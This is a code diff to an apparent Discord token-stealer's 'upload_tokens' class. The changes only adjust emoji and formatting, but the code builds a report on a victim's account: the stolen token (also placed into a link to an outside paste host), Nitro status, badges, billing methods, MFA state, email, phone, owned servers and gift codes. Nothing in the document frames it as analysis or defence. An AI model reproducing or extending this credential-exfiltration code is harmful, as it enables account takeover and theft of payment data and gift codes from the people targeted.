@@ -273,7 +273,7 @@ class upload_tokens:
                         else:
                             invite = "https://youtu.be/dQw4w9WgXcQ"
 
-                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
+                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: `` <:disocrdserver:1075865836486660317> {guild['approximate_member_count']}   `` \n <:iconjoin:1075865838751588434> [Join Server]({invite})"
                         
                         if len('\n'.join(hq_guilds)) + len(data) >= 1024:
                             break
@@ -323,7 +323,7 @@ class upload_tokens:
                     name = code['promotion']['outbound_title']
                     code = code['code']
 
-                    data = f":gift: `{name}`\n:ticket: `{code}`"
+                    data = f"`:gift: `{name}`\n:ticket: ``{code}``"
 
                     if len('\n\n'.join(codes)) + len(data) >= 1024:
                         break
@@ -343,15 +343,15 @@ class upload_tokens:
             embed.set_thumbnail(url=avatar)
 
             embed.add_field(name="<:Among_Us_Black:1073744915932119151> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
-            embed.add_field(name="<a:Evolving_badge_Nitro_a_scaling:1073743165821034577> Nitro:", value=f"{nitro}", inline=True)
-            embed.add_field(name="<a:BadgesRoll:1073745137445904434> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
-            embed.add_field(name="<:Discord_CreditCard:1073745405285765160> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
-            embed.add_field(name="<:SecuritySheild:1073745717073563678> MFA:", value=f"{mfa}", inline=True)
+            embed.add_field(name="<a:Evolving_badge_Nitro_a_scaling:1073743165821034577> Nitro:", value=f"```{nitro}```", inline=True)
+            embed.add_field(name="<a:BadgesRoll:1073745137445904434> Badges:", value=f"```{badges if badges != '' else 'None'}```", inline=True)
+            embed.add_field(name="<:Discord_CreditCard:1073745405285765160> Billing:", value=f"```{payment_methods if payment_methods != '' else 'None'}```", inline=True)
+            embed.add_field(name="<:SecuritySheild:1073745717073563678> MFA:", value=f"```{mfa}```", inline=True)
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
             
             embed.add_field(name="<:Gmail:1073746145467183164> Email:", value=f"{email if email != None else 'None'}", inline=True)
-            embed.add_field(name="<:IphoneX:1073746048851398676> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
+            embed.add_field(name=":mobile_phone: Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
 
